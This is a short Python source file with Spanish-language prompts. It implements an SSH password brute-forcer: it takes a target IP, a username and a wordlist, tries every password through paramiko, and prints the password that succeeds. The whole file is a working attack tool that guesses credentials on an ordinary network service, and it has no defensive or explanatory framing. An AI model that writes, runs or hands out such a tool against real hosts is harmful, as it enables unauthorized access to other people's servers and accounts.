import paramiko
from utils.colors import Colors

def password_cracker():
    host = input(f"{Colors.BOLD}{Colors.WARNING}Introduce la dirección IP: {Colors.ENDC}")
    username = input(f"{Colors.BOLD}{Colors.WARNING}Introduce el nombre de usuario: {Colors.ENDC}")
    password_file = input(f"{Colors.BOLD}{Colors.WARNING}Introduce la ruta al archivo de contraseñas: {Colors.ENDC}")
    
    with open(password_file, 'r') as file:
        for password in file.readlines():
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=username, password=password)
                print(f"{Colors.OKGREEN}Contraseña encontrada: {password}{Colors.ENDC}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                print(f"{Colors.FAIL}Probando contraseña: {password}{Colors.ENDC}")
    print(f"{Colors.FAIL}No se encontró la contraseña.{Colors.ENDC}")